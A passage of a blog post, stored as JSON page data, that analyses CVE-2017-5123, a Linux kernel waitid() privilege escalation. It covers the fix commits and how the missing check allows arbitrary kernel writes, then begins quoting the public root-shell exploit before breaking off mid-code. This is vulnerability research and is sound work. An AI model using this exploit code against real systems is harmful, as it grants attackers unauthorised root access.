{"componentChunkName":"component---src-templates-post-tsx","path":"/CVE-2017-5123/","result":{"data":{"markdownRemark":{"html":"<p>Linux Kernel waitid() Local Privilege Escalation</p>\n<h2 id=\"tldr\" style=\"position:relative;\"><a href=\"#tldr\" aria-label=\"tldr permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>TL;DR</h2>\n<p>Some days ago, i just saw this vulnerability somewhere in google. It's about <strong>Kernel Exploitation, CVE-2017-5123</strong>.\nMaybe It works on 4.14.0-rc1 ~ 4.14.0-rc4 and the latest released version is 4.14.0-rc7 and stable build is 4.13.10 (2017/11/2).</p>\n<p>The reasons for analyzing this vulnerability are 'the payload' and 'the vulnerability'. Because it just triggers <em>null dereference</em> which is rarely seen.\nSo, I just think that... how could it be? at the first time without seeing any information.\nNot only that, but it was also strange that this vulnerability exists in the latest!</p>\n<h2 id=\"1---day-vulnerability--cve-2017-5123\" style=\"position:relative;\"><a href=\"#1---day-vulnerability--cve-2017-5123\" aria-label=\"1   day vulnerability  cve 2017 5123 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1 - day vulnerability : CVE-2017-5123</h2>\n<p>Let's see the title first :)</p>\n<blockquote>\n<p><strong>Linux Kernel 4.14.0-rc4+ - 'waitid()' Privilege Escalation</strong></p>\n</blockquote>\n<p>It's an LPE(Local Privilege Escalation) using waitid().</p>\n<p>Now, let's see the difference of the codes and commits by version and how it works.</p>\n<h2 id=\"before\" style=\"position:relative;\"><a href=\"#before\" aria-label=\"before permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Before</h2>\n<p><a href=\"https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=4c48abe91be03d191d0c20cc755877da2cb35622\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Before Commit</a>.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">@@ <span class=\"token operator\">-</span><span class=\"token number\">1625</span><span class=\"token punctuation\">,</span><span class=\"token number\">15</span> <span class=\"token operator\">+</span><span class=\"token number\">1625</span><span class=\"token punctuation\">,</span><span class=\"token number\">18</span> @@ <span class=\"token function\">SYSCALL_DEFINE5</span><span class=\"token punctuation\">(</span>waitid<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> which<span class=\"token punctuation\">,</span> <span class=\"token class-name\">pid_t</span><span class=\"token punctuation\">,</span> upid<span class=\"token punctuation\">,</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">siginfo</span> __user <span class=\"token operator\">*</span><span class=\"token punctuation\">,</span>\n \t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>infop<span class=\"token punctuation\">)</span>\n \t\t<span class=\"token keyword\">return</span> err<span class=\"token punctuation\">;</span>\n \n<span class=\"token operator\">-</span>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">put_user</span><span class=\"token punctuation\">(</span>err <span class=\"token operator\">?</span> <span class=\"token number\">0</span> <span class=\"token operator\">:</span> SIGCHLD<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>infop<span class=\"token operator\">-></span>si_signo<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span>\n<span class=\"token operator\">-</span>\t    <span class=\"token function\">put_user</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>infop<span class=\"token operator\">-></span>si_errno<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span>\n<span class=\"token operator\">-</span>\t    <span class=\"token function\">put_user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">short</span><span class=\"token punctuation\">)</span>info<span class=\"token punctuation\">.</span>cause<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>infop<span class=\"token operator\">-></span>si_code<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span>\n<span class=\"token operator\">-</span>\t    <span class=\"token function\">put_user</span><span class=\"token punctuation\">(</span>info<span class=\"token punctuation\">.</span>pid<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>infop<span class=\"token operator\">-></span>si_pid<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span>\n<span class=\"token operator\">-</span>\t    <span class=\"token function\">put_user</span><span class=\"token punctuation\">(</span>info<span class=\"token punctuation\">.</span>uid<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>infop<span class=\"token operator\">-></span>si_uid<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span>\n<span class=\"token operator\">-</span>\t    <span class=\"token function\">put_user</span><span class=\"token punctuation\">(</span>info<span class=\"token punctuation\">.</span>status<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>infop<span class=\"token operator\">-></span>si_status<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">-</span>\t\terr <span class=\"token operator\">=</span> <span class=\"token operator\">-</span>EFAULT<span class=\"token punctuation\">;</span>\n<span class=\"token operator\">-</span>\n<span class=\"token operator\">+</span>\t<span class=\"token function\">user_access_begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span>\t<span class=\"token function\">unsafe_put_user</span><span class=\"token punctuation\">(</span>err <span class=\"token operator\">?</span> <span class=\"token number\">0</span> <span class=\"token operator\">:</span> SIGCHLD<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>infop<span class=\"token operator\">-></span>si_signo<span class=\"token punctuation\">,</span> Efault<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span>\t<span class=\"token function\">unsafe_put_user</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>infop<span class=\"token operator\">-></span>si_errno<span class=\"token punctuation\">,</span> Efault<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span>\t<span class=\"token function\">unsafe_put_user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">short</span><span class=\"token punctuation\">)</span>info<span class=\"token punctuation\">.</span>cause<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>infop<span class=\"token operator\">-></span>si_code<span class=\"token punctuation\">,</span> Efault<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span>\t<span class=\"token function\">unsafe_put_user</span><span class=\"token punctuation\">(</span>info<span class=\"token punctuation\">.</span>pid<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>infop<span class=\"token operator\">-></span>si_pid<span class=\"token punctuation\">,</span> Efault<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span>\t<span class=\"token function\">unsafe_put_user</span><span class=\"token punctuation\">(</span>info<span class=\"token punctuation\">.</span>uid<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>infop<span class=\"token operator\">-></span>si_uid<span class=\"token punctuation\">,</span> Efault<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span>\t<span class=\"token function\">unsafe_put_user</span><span class=\"token punctuation\">(</span>info<span class=\"token punctuation\">.</span>status<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>infop<span class=\"token operator\">-></span>si_status<span class=\"token punctuation\">,</span> Efault<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span>\t<span class=\"token function\">user_access_end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n \t<span class=\"token keyword\">return</span> err<span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span>Efault<span class=\"token operator\">:</span>\n<span class=\"token operator\">+</span>\t<span class=\"token function\">user_access_end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span>\t<span class=\"token keyword\">return</span> <span class=\"token operator\">-</span>EFAULT<span class=\"token punctuation\">;</span>\n <span class=\"token punctuation\">}</span>\n \n <span class=\"token keyword\">static</span> <span class=\"token keyword\">long</span> <span class=\"token function\">kernel_wait4</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">pid_t</span> upid<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> __user <span class=\"token operator\">*</span>stat_addr<span class=\"token punctuation\">,</span>\n@@ <span class=\"token operator\">-</span><span class=\"token number\">1736</span><span class=\"token punctuation\">,</span><span class=\"token number\">13</span> <span class=\"token operator\">+</span><span class=\"token number\">1739</span><span class=\"token punctuation\">,</span><span class=\"token number\">20</span> @@ <span class=\"token function\">COMPAT_SYSCALL_DEFINE5</span><span class=\"token punctuation\">(</span>waitid<span class=\"token punctuation\">,</span>\n \t\t\t<span class=\"token keyword\">return</span> <span class=\"token operator\">-</span>EFAULT<span class=\"token punctuation\">;</span>\n \t<span class=\"token punctuation\">}</span>\n \n<span class=\"token operator\">-</span>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">put_user</span><span class=\"token punctuation\">(</span>err <span class=\"token operator\">?</span> <span class=\"token number\">0</span> <span class=\"token operator\">:</span> SIGCHLD<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>infop<span class=\"token operator\">-></span>si_signo<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span>\n<span class=\"token operator\">-</span>\t    <span class=\"token function\">put_user</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>infop<span class=\"token operator\">-></span>si_errno<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span>\n<span class=\"token operator\">-</span>\t    <span class=\"token function\">put_user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">short</span><span class=\"token punctuation\">)</span>info<span class=\"token punctuation\">.</span>cause<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>infop<span class=\"token operator\">-></span>si_code<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span>\n<span class=\"token operator\">-</span>\t    <span class=\"token function\">put_user</span><span class=\"token punctuation\">(</span>info<span class=\"token punctuation\">.</span>pid<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>infop<span class=\"token operator\">-></span>si_pid<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span>\n<span class=\"token operator\">-</span>\t    <span class=\"token function\">put_user</span><span class=\"token punctuation\">(</span>info<span class=\"token punctuation\">.</span>uid<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>infop<span class=\"token operator\">-></span>si_uid<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span>\n<span class=\"token operator\">-</span>\t    <span class=\"token function\">put_user</span><span class=\"token punctuation\">(</span>info<span class=\"token punctuation\">.</span>status<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>infop<span class=\"token operator\">-></span>si_status<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">-</span>\t\terr <span class=\"token operator\">=</span> <span class=\"token operator\">-</span>EFAULT<span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>infop<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">+</span>\t\t<span class=\"token keyword\">return</span> err<span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span>\n<span class=\"token operator\">+</span>\t<span class=\"token function\">user_access_begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span>\t<span class=\"token function\">unsafe_put_user</span><span class=\"token punctuation\">(</span>err <span class=\"token operator\">?</span> <span class=\"token number\">0</span> <span class=\"token operator\">:</span> SIGCHLD<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>infop<span class=\"token operator\">-></span>si_signo<span class=\"token punctuation\">,</span> Efault<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span>\t<span class=\"token function\">unsafe_put_user</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>infop<span class=\"token operator\">-></span>si_errno<span class=\"token punctuation\">,</span> Efault<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span>\t<span class=\"token function\">unsafe_put_user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">short</span><span class=\"token punctuation\">)</span>info<span class=\"token punctuation\">.</span>cause<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>infop<span class=\"token operator\">-></span>si_code<span class=\"token punctuation\">,</span> Efault<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span>\t<span class=\"token function\">unsafe_put_user</span><span class=\"token punctuation\">(</span>info<span class=\"token punctuation\">.</span>pid<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>infop<span class=\"token operator\">-></span>si_pid<span class=\"token punctuation\">,</span> Efault<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span>\t<span class=\"token function\">unsafe_put_user</span><span class=\"token punctuation\">(</span>info<span class=\"token punctuation\">.</span>uid<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>infop<span class=\"token operator\">-></span>si_uid<span class=\"token punctuation\">,</span> Efault<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span>\t<span class=\"token function\">unsafe_put_user</span><span class=\"token punctuation\">(</span>info<span class=\"token punctuation\">.</span>status<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>infop<span class=\"token operator\">-></span>si_status<span class=\"token punctuation\">,</span> Efault<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span>\t<span class=\"token function\">user_access_end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n \t<span class=\"token keyword\">return</span> err<span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span>Efault<span class=\"token operator\">:</span>\n<span class=\"token operator\">+</span>\t<span class=\"token function\">user_access_end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span>\t<span class=\"token keyword\">return</span> <span class=\"token operator\">-</span>EFAULT<span class=\"token punctuation\">;</span>\n <span class=\"token punctuation\">}</span>\n <span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></code></pre></div>\n<p>This commit is from <em>Linux Kernel v4.13.x</em>, In the existing waitid(),</p>\n<blockquote>\n<p>siginfo __user *</p>\n</blockquote>\n<p>there were codes checking it whether user-land or kernel-land address. But it <strong>removed</strong>.\nSo, by __user *, kernel-land access could be possible on user-land.</p>\n<p>Let's say from an exploit point of view, waitid() form what we use is</p>\n<blockquote>\n<p>int waitid(idtype_t idtype, id_t id, siginfo_t *infop, int options);</p>\n</blockquote>\n<p>like that. By using <em>infop</em>, we can <strong>write</strong> arbitrary value on <strong>arbitrary kernel-land memory</strong> and control it!\nI'm out of words :|</p>\n<h2 id=\"after\" style=\"position:relative;\"><a href=\"#after\" aria-label=\"after permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>After</h2>\n<p><a href=\"https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=96ca579a1ecc943b75beba58bebb0356f6cc4b51\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">After Commit</a>.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">diff <span class=\"token operator\">--</span>git a<span class=\"token operator\">/</span>kernel<span class=\"token operator\">/</span>exit<span class=\"token punctuation\">.</span>c b<span class=\"token operator\">/</span>kernel<span class=\"token operator\">/</span>exit<span class=\"token punctuation\">.</span>c\nindex f2cd53e<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>cf28528 <span class=\"token number\">100644</span>\n<span class=\"token operator\">--</span><span class=\"token operator\">-</span> a<span class=\"token operator\">/</span>kernel<span class=\"token operator\">/</span>exit<span class=\"token punctuation\">.</span>c\n<span class=\"token operator\">++</span><span class=\"token operator\">+</span> b<span class=\"token operator\">/</span>kernel<span class=\"token operator\">/</span>exit<span class=\"token punctuation\">.</span>c\n@@ <span class=\"token operator\">-</span><span class=\"token number\">1610</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span> <span class=\"token operator\">+</span><span class=\"token number\">1610</span><span class=\"token punctuation\">,</span><span class=\"token number\">9</span> @@ <span class=\"token function\">SYSCALL_DEFINE5</span><span class=\"token punctuation\">(</span>waitid<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> which<span class=\"token punctuation\">,</span> <span class=\"token class-name\">pid_t</span><span class=\"token punctuation\">,</span> upid<span class=\"token punctuation\">,</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">siginfo</span> __user <span class=\"token operator\">*</span><span class=\"token punctuation\">,</span>\n \t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>infop<span class=\"token punctuation\">)</span>\n \t\t<span class=\"token keyword\">return</span> err<span class=\"token punctuation\">;</span>\n \n<span class=\"token operator\">+</span>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">access_ok</span><span class=\"token punctuation\">(</span>VERIFY_WRITE<span class=\"token punctuation\">,</span> infop<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>infop<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">+</span>\t\t<span class=\"token keyword\">goto</span> Efault<span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span>\n \t<span class=\"token function\">user_access_begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n \t<span class=\"token function\">unsafe_put_user</span><span class=\"token punctuation\">(</span>signo<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>infop<span class=\"token operator\">-></span>si_signo<span class=\"token punctuation\">,</span> Efault<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n \t<span class=\"token function\">unsafe_put_user</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>infop<span class=\"token operator\">-></span>si_errno<span class=\"token punctuation\">,</span> Efault<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n@@ <span class=\"token operator\">-</span><span class=\"token number\">1735</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span> <span class=\"token operator\">+</span><span class=\"token number\">1738</span><span class=\"token punctuation\">,</span><span class=\"token number\">9</span> @@ <span class=\"token function\">COMPAT_SYSCALL_DEFINE5</span><span class=\"token punctuation\">(</span>waitid<span class=\"token punctuation\">,</span>\n \t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>infop<span class=\"token punctuation\">)</span>\n \t\t<span class=\"token keyword\">return</span> err<span class=\"token punctuation\">;</span>\n \n<span class=\"token operator\">+</span>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">access_ok</span><span class=\"token punctuation\">(</span>VERIFY_WRITE<span class=\"token punctuation\">,</span> infop<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>infop<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">+</span>\t\t<span class=\"token keyword\">goto</span> Efault<span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span>\n \t<span class=\"token function\">user_access_begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n \t<span class=\"token function\">unsafe_put_user</span><span class=\"token punctuation\">(</span>signo<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>infop<span class=\"token operator\">-></span>si_signo<span class=\"token punctuation\">,</span> Efault<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n \t<span class=\"token function\">unsafe_put_user</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>infop<span class=\"token operator\">-></span>si_errno<span class=\"token punctuation\">,</span> Efault<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>Nowadays, it just fixed like above.</p>\n<h2 id=\"payload-analysis\" style=\"position:relative;\"><a href=\"#payload-analysis\" aria-label=\"payload analysis permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Payload Analysis</h2>\n<p>Of course, by above vulnerability, we can trigger that with <strong>several various ways</strong> but let's see 'the orignal' first :)\n<a href=\"https://www.exploit-db.com/exploits/43029/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">payload</a>.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">_GNU_SOURCE</span></span>\n \n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/wait.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/mman.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n \n<span class=\"token keyword\">struct</span> <span class=\"token class-name\">cred</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">struct</span> <span class=\"token class-name\">task_struct</span><span class=\"token punctuation\">;</span>\n  \n<span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">cred</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token class-name\">prepare_kernel_cred_t</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">task_struct</span> <span class=\"token operator\">*</span>daemon<span class=\"token punctuation\">)</span> <span class=\"token keyword\">__attribute__</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">regparm</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">typedef</span> <span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token class-name\">commit_creds_t</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">cred</span> <span class=\"token operator\">*</span>new<span class=\"token punctuation\">)</span> <span class=\"token keyword\">__attribute__</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">regparm</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  \n<span class=\"token class-name\">prepare_kernel_cred_t</span>   prepare_kernel_cred<span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">commit_creds_t</span>    commit_creds<span class=\"token punctuation\">;</span>\n  \n<span class=\"token keyword\">void</span> <span class=\"token function\">get_shell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n  \n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">getuid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] Root shell success !! :)\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">execve</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token 